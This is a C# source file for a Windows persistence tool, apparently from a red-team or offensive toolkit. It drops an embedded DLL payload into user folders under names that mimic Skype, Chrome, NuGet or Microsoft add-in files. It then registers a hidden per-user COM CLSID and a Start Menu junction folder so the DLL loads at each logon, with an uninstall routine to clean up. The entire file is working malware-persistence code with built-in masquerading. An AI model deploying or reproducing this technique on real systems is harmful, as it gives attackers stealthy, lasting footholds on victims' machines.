using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using Microsoft.Win32;

namespace AccessibilityFeaturesPersistence
{
    class Program
    {
        static string TechnologyName;

        public static void DeleteDirectory(string target_dir)
        {
            string[] files = Directory.GetFiles(target_dir);
            string[] dirs = Directory.GetDirectories(target_dir);

            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            foreach (string dir in dirs)
            {
                DeleteDirectory(dir);
            }

            Directory.Delete(target_dir, false);
        }

        static void UninstallProgram(string comGuid)
        {
            Console.WriteLine("[*] Removing {0}", comGuid);
            string comGuidRegPath = "Software\\Classes\\CLSID\\" + comGuid;
            string inProc32Path = comGuidRegPath + "\\InprocServer32";
            RegistryKey inProcKey = Registry.CurrentUser.OpenSubKey(inProc32Path);
            var dllPathObj = inProcKey.GetValue("");
            var companyObj = inProcKey.GetValue("Company");
            string dllPath = dllPathObj.ToString();
            string junctionFolder = Environment.GetEnvironmentVariable("APPDATA") + "\\" + companyObj.ToString();
            try
            {
                Console.Write("[*] Attempting to delete {0}... ", dllPath);
                File.Delete(dllPath);
                Console.WriteLine("Done.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("FAILURE.\n[-] Reason: {0}", ex.Message);
            }
            try
            {
                Console.Write("[*] Attempting to delete registry tree: {0}... ", comGuidRegPath);
                Registry.CurrentUser.DeleteSubKeyTree(comGuidRegPath);
                Console.WriteLine("Done.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("FAILURE.");
                Console.WriteLine("Reason:");
                Console.WriteLine(ex);
            }
            try
            {
                Console.Write("[*] Attempting to delete {0}... ", junctionFolder);
                DeleteDirectory(junctionFolder);
                Console.WriteLine("Done.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("FAILURE.");
                Console.WriteLine("Reason:");
                Console.WriteLine(ex);
            }
            Console.WriteLine("[*] All Done.");
        }

        static void InstallProgram()
        {
            string dllPath = "";
            try
            {
                dllPath = CreateDLL();   
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error creating DLL. Stack trace:");
                Console.WriteLine(ex);
                Console.Write("\nAborting.");
                Environment.Exit(1);
            }
            Console.WriteLine("[*] File created: {0}", dllPath);
            Guid comGuid = Guid.NewGuid();
            Console.WriteLine("[*] Using GUID: {" + comGuid.ToString() + "}");
            if (CreateRegistryKeys(comGuid.ToString(), dllPath))
            {
                Console.WriteLine("[*] Registry updated with CLSID: {" + comGuid.ToString() + "}");
                string junctionDir = CreateJunctionFolder(comGuid.ToString());
                Console.WriteLine("[+] All done!");
            }
            else
            {
                Console.WriteLine("[-] Error creating registry keys. Rerun the assembly with 'uninstall {guid}' flag.");

                Environment.Exit(1);
            }
        }

        static bool CreateRegistryKeys(string comGuid, string dllPath)
        {
            try
            {
                string comGuidRegPath = "Software\\Classes\\CLSID\\{" + comGuid + "}";
                string inProc32Path = comGuidRegPath + "\\InprocServer32";
                string shellFolderPath = comGuidRegPath + "\\ShellFolder";
                RegistryKey inProcKey;
                Registry.CurrentUser.CreateSubKey(comGuidRegPath);
                inProcKey = Registry.CurrentUser.CreateSubKey(inProc32Path);
                inProcKey.SetValue("", dllPath);
                inProcKey.SetValue("ThreadingModel", "Apartment");
                inProcKey.SetValue("LoadWithoutCOM", "");
                inProcKey.SetValue("DateTime", 0, RegistryValueKind.DWord);
                inProcKey.SetValue("Company", TechnologyName);
                RegistryKey shellFolderKey = Registry.CurrentUser.CreateSubKey(shellFolderPath);
                shellFolderKey.SetValue("HideOnDesktop", "", RegistryValueKind.String);
                uint attr = (uint)(0xf090013d);
                shellFolderKey.SetValue("Attributes", (int)attr, RegistryValueKind.DWord);
                inProcKey.Close();
                shellFolderKey.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error creating registry keys. Stack trace:");
                Console.WriteLine(ex);
                return false;
            }
            return true;
        }

        static string CreateJunctionFolder(string guid)
        {
            string appDataPath = Environment.GetEnvironmentVariable("APPDATA");
            string appPath = appDataPath + "\\Microsoft\\Windows\\Start Menu\\Programs\\";
            string techPath = appPath + TechnologyName + ".{" + guid + "}";
            try
            {
                Directory.CreateDirectory(techPath);
                Console.WriteLine("[+] Created {0}", techPath);
                return techPath;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error creating junction directory.");
                return "";
            }
        }

        static string CreateDLL()
        {
            string tempPath = Environment.GetEnvironmentVariable("APPDATA");
            string dllPath = "";
            string msftAddinDirectory = tempPath + "\\Microsoft\\AddIns\\";
            string skypeDirectory = tempPath + "\\Skype\\RootTools\\";
            string nugetPath = tempPath + "\\NuGet\\";
            string chromeUserDataDirectory = tempPath + "\\Google\\Chrome\\User Data\\";
            if (Directory.Exists(skypeDirectory))
            {
                dllPath = skypeDirectory + "roottools.dll";
                TechnologyName = "Skype";
            }
            else if (Directory.Exists(chromeUserDataDirectory))
            {
                dllPath = chromeUserDataDirectory + "userutils.dll";
                TechnologyName = "Google";
            }
            else if (Directory.Exists(nugetPath))
            {
                dllPath = nugetPath + "NuGet.dll";
                TechnologyName = "NuGet";
            }
            else if (Directory.Exists(msftAddinDirectory))
            {
                dllPath = msftAddinDirectory + "AccessibilityFeatures.dll";
                TechnologyName = "MicrosoftAddins";
            }
            else
            {
                dllPath = tempPath + "\\AccessibilityFeatures.dll";
                TechnologyName = "AccessbilityFeatures";
            }
            File.WriteAllBytes(dllPath, Properties.Resources.ScatterBrain);
            return dllPath;
        }

        static void DeleteFile()
        {
            string tempPath = Environment.GetEnvironmentVariable("APPDATA");
            string dllPath = "";
            string msftAddinDirectory = tempPath + "\\Microsoft\\AddIns\\";
            string skypeDirectory = tempPath + "\\Skype\\RootTools\\";
            string nugetPath = tempPath + "\\NuGet\\";
            string chromeUserDataDirectory = tempPath + "\\Google\\Chrome\\User Data\\";
            if (Directory.Exists(skypeDirectory))
            {
                dllPath = skypeDirectory + "roottools.dll";
            }
            else if (Directory.Exists(chromeUserDataDirectory))
            {
                dllPath = chromeUserDataDirectory + "userutils.dll";
            }
            else if (Directory.Exists(nugetPath))
            {
                dllPath = nugetPath + "NuGet.dll";
            }
            else if (Directory.Exists(msftAddinDirectory))
            {
                dllPath = msftAddinDirectory + "AccessibilityFeatures.dll";
            }
            else
            {
                dllPath = tempPath + "\\AccessibilityFeatures.dll";
            }
            if (dllPath != "")
            {
                File.Delete(dllPath);
                Console.WriteLine("[*] Deleted {0}", dllPath);
            }
            else
            {
                Console.WriteLine("[-] Could not find dll.");
            }
        }

        static void Usage()
        {
            string usage = @"
Usage:
    Arguments:
        install           - Installs the agent.
        uninstall {CLSID} - Uninstalls the given CLSID.

    Examples:
        .\AccessibilityFeaturesPersistence.exe install
        .\AccessibilityFeaturesPersistence.exe uninstall ""{a3df199e-bc97-4c87-ada6-4b5287a0d9e5}""
";
            Console.WriteLine(usage);
        }

        static void Main(string[] args)
        {
            if (args.Length == 0 || args.Length > 2)
            {
                Usage();
                Environment.Exit(0);
            }
            else if (args[0] == "install")
            {
                InstallProgram();
            }
            else if (args[0] == "uninstall" && args.Length == 2)
            {
                if (args[1].Length != 38)
                {
                    Console.WriteLine("[-] Error parsing CLSID. Must be of the form: {CLSID}");
                    Environment.Exit(1);
                }
                UninstallProgram(args[1]);
            }
            else
            {
                Usage();
                Environment.Exit(1);
            }
        }
    }
}
